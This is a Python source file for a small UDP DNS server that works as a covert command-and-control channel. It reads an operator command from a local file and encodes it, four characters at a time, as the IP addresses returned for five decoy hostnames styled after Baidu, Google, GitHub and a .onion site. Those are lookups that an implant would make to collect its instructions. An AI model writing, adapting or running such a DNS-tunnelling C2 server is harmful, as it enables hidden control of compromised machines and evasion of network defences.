import socketserver
import struct
import  threading
 
# DNS Query
class SinDNSQuery:
    def __init__(self, data):
        i = 1
        self.name = ''
        while True:
            d = data[i]
            if d == 0:
                break;
            if d < 32:
                self.name = self.name + '.'
            else:
                self.name = self.name + chr(d)
            i = i + 1
        self.querybytes = data[0:i + 1]
        (self.type, self.classify) = struct.unpack('>HH', data[i + 1:i + 5])
        self.len = i + 5
    def getbytes(self):
        return self.querybytes + struct.pack('>HH', self.type, self.classify)
 
# DNS Answer RRS
class SinDNSAnswer:
    def __init__(self, ip):
        self.name = 49164
        self.type = 1
        self.classify = 1
        self.timetolive = 190
        self.datalength = 4
        self.ip = ip
    def getbytes(self):
        res = struct.pack('>HHHLH', self.name, self.type, self.classify, self.timetolive, self.datalength)
        s = self.ip.split('.')
        res = res + struct.pack('BBBB', int(s[0]), int(s[1]), int(s[2]), int(s[3]))
        return res
 
# DNS frame
class SinDNSFrame:
    def __init__(self, data):
        (self.id, self.flags, self.quests, self.answers, self.author, self.addition) = struct.unpack('>HHHHHH', data[0:12])
        self.query = SinDNSQuery(data[12:])
    def getname(self):
        return self.query.name
    def setip(self, ip):
        self.answer = SinDNSAnswer(ip)
        self.answers = 1
        self.flags = 33152
    def getbytes(self):
        res = struct.pack('>HHHHHH', self.id, self.flags, self.quests, self.answers, self.author, self.addition)
        res = res + self.query.getbytes()
        if self.answers != 0:
            res = res + self.answer.getbytes()
        return res

class SinDNSUDPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        time = 0
        cmd = ""
        data = self.request[0].strip()
        dns = SinDNSFrame(data)
        socket = self.request[1]
        namemap = SinDNSServer.namemap
        def hello():
            n=1
            socket.sendto(dns.getbytes(), self.client_address)
            print (n)
            n=n+1
        if(dns.query.type==1):
            name = dns.getname();
            if namemap.__contains__(name):
                # If have record, response it
                def readcmd():
                    with open("cmd.txt", "r") as c:
                        cmd = c.readlines().pop()
                        l = 20 - len(cmd[:-1])
                        cmd = cmd[:-1] + "\a"+ "r"*(l-1)
                    return cmd
                #montage cmd
                def setcmd(cmd):
                    namemap["www.api.baidu.com"] = str(ord(cmd[0])) + "." + str(ord(cmd[1])) + '.' + str(ord(cmd[2])) + '.' + str(ord(cmd[3]))
                    namemap['www.zoom.google.vip'] = str(ord(cmd[4])) + "." + str(ord(cmd[5])) + '.' + str(ord(cmd[6])) + '.' + str(ord(cmd[7]))
                    namemap['api.pan.baidu.com'] = str(ord(cmd[8])) + "." + str(ord(cmd[9])) + '.' + str(ord(cmd[10])) + '.' + str(ord(cmd[11]))
                    namemap['zz.github.org'] = str(ord(cmd[12])) + "." + str(ord(cmd[13])) + '.' + str(ord(cmd[14])) + '.' + str(ord(cmd[15]))
                    namemap['video.blowtoheaven.onion'] = str(ord(cmd[16])) + "." + str(ord(cmd[17])) + '.' + str(ord(cmd[18])) + '.' + str(ord(cmd[19]))
                if time == 0:
                    cmd = readcmd()
                    print(cmd)
                    setcmd(cmd)
                    time = 4
                else:
                    time = time-1
                dns.setip(namemap[name])
                socket.sendto(dns.getbytes(), self.client_address)
            elif namemap.__contains__('*'):
                # Response default address
                dns.setip(namemap['*'])
                def main():
                    t=threading.Thread(target=hello())
                    t.start()
                main()
                
            else:
                # ignore it
                socket.sendto(data, self.client_address)
                print(3)
        else:
            # If this is not query a A record, ignore it
            socket.sendto(data, self.client_address)
 
#DNS server can only add A record
class SinDNSServer:
    def __init__(self, port=10086):
        SinDNSServer.namemap = {}
        self.port = port
    def addname(self, name, ip):
        SinDNSServer.namemap[name] = ip
    def start(self):
        HOST, PORT = "0.0.0.0", self.port
        server = socketserver.UDPServer((HOST, PORT), SinDNSUDPHandler)
        server.serve_forever()
 
#main
if __name__ == "__main__":
    sev = SinDNSServer()
    sev.addname('www.api.baidu.com', '0.0.0.0')
    sev.addname('www.zoom.google.vip', '0.0.0.0')
    sev.addname('api.pan.baidu.com', '0.0.0.0')
    sev.addname('zz.github.org', '0.0.0.0')
    sev.addname('video.blowtoheaven.onion', '0.0.0.0')
    sev.addname('*', '192.168.1.1')
    sev.start()
